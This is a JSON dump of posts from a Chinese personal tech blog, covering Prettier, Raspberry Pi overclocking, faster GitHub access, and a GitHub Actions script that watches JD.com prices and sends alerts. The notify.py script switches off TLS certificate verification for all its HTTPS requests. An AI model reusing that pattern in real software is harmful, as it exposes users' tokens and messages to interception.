<span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span 